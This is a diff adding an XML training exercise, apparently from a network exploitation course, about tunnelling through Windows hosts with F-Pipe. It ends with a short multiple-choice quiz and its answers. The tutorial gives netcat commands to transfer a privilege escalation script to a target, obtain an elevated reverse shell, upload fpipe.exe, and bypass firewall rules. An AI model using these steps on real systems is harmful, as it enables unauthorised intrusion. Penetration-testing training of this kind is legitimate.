@@ -1,0 +1,52 @@
+<?xml version="1.0"?>
+<exercises>
+  <exercise>
+    <title>Fun With F-Pipe</title>
+    <difficulty>3</difficulty>
+    <category>CNE</category>
+    <name>fun_with_fpipe</name>
+    <dependencies>priv_esc</dependencies>
+    <shortdescription>Use F-Pipe to tunnel through Windows systems.</shortdescription>
+    <description>This exercise is designed to reinforce tunneling concepts using tools other than ssh. This exercise is a bit difficult to perform and conceptualize. </description>
+    <tutorial>&lt;p&gt;Tunneling Concepts. This is literally the most fun you can possibly ever have in your life so be prepared. Video below is for help with understanding how SSH Tunnels work.&lt;/p&gt;&#xD;
+&lt;ol&gt;&#xD;
+&lt;li&gt;Exploit a target with user level privileges (spear phishing, etc)&lt;/li&gt;&#xD;
+&lt;li&gt;Make sure netcat is on the target computer&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax on your kali box: cat /mnt/training/y_resources/esc/esc.vbe| nc -v -l -p 80&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax on your target machine nc -v -w 30 192.20.128.11 80 &amp;gt; C:\Users\Public\Pictures\esc.vbe&lt;/li&gt;&#xD;
+&lt;li&gt;Wait a long time, it is uploading your script, press return every few seconds on the target machine&lt;/li&gt;&#xD;
+&lt;li&gt;Open another netcat listener on your kali machine on port 80&lt;/li&gt;&#xD;
+&lt;li&gt;Execute the privilege escalation script esc.vbe on the target machine and you will return an elevated shell to your open listener now for the fun. do not close any of your open shells ever unless it breaks you can always repeat steps 6 and 7 from your original unprivileged shell for a new shell.&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax on your kali box to upload fpipe: cat /mnt/training/y_resources/fpipe/fpipe.exe| nc -v -l -p 80&lt;/li&gt;&#xD;
+&lt;li&gt;Repeat steps 4 and 5 except replace "esc.vbe" with "fpipe.exe" in step 4&lt;/li&gt;&#xD;
+&lt;li&gt;Do an ipconfig and note the ip address of the target.&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax to create a tunnel from the target worstation back to your kali box: fpipe -l 443 -s 12345 -r 80 192.20.128.11 concept: program will listen for connections on port 443 and redirect them to 192.20.128.11 with a destination port of 80 and a source port of 12345&lt;/li&gt;&#xD;
+&lt;li&gt;Use the following syntax to create a netcat echo server on your kali box nc -e /bin/cat -l -v -p 80&lt;/li&gt;&#xD;
+&lt;li&gt;Utilize your tunnel to connect to your echo server! syntax on your kali box: nc -p 443 -v 443 concept: this connects to the target both a source and destination port of 443. If you had done a thorough port scan of the target network you might have found that packets with destination port 443 are allowed in the WAN interface of their firewall but blocked going into the private network. in order for clients in the private network to connect to web servers, however, packets with a source port of 443 are allowed into the private network. The administrator made a mistake by allowing new connections (SYN) with a source port of 443 rather than only allowing established connections (SYN/ACK or greater). obviously requests to the webserver are allowed out of the private network with a destination port of 443. This is how you breached all three of the firewall rule sets between you and the target. The connections look like this: 192.20.128.11:443 -&amp;gt; :443 ; :12345 -&amp;gt; 192.20.128.11:80 therefore: :443 = 192.20.128.11:80 and :12345 = 192.20.128.11:443. Keep in mind that the target has to actually be listening on a port, or circumventing the firewall in this manner is useless.&lt;/li&gt;&#xD;
+&lt;li&gt;After it connects, type something in the window and press return.&lt;/li&gt;&#xD;
+&lt;li&gt;Experience the unrivaled entertainment value provided by having everything you type sent through a tunnel hosted on your target machine, routed back to the echo server on your kali box, duplicated, sent back through the tunnel, routed to your netcat client, and displayed right on your screen!&lt;/li&gt;&#xD;
+&lt;/ol&gt;</tutorial>
+    <question>
+      <text>What method of encryption does F-Pipe use for communications?</text>
+      <type>multiple</type>
+      <answer>None</answer>
+      <wrong>TLS</wrong>
+      <wrong>RSA256</wrong>
+      <wrong>SSH</wrong>
+    </question>
+    <question>
+      <text>Why would you use F-Pipe rather than SSH on a target machine?</text>
+      <type>multiple</type>
+      <answer>F-Pipe might be used if there is nothing else available or if you are on a Windows target</answer>
+      <wrong>F-Pipe is more modern than SSH and has newer technologies</wrong>
+      <wrong>F-Pipe uses encryption and SSH doesn't</wrong>
+      <wrong>F-Pipe should be used exclusively on Linux targets</wrong>
+    </question>
+    <question>
+      <text>Is F-Pipe TCP or UDP based?</text>
+      <type>multiple</type>
+      <answer>TCP</answer>
+      <wrong>UDP</wrong>
+    </question>
+  </exercise>
+</exercises>
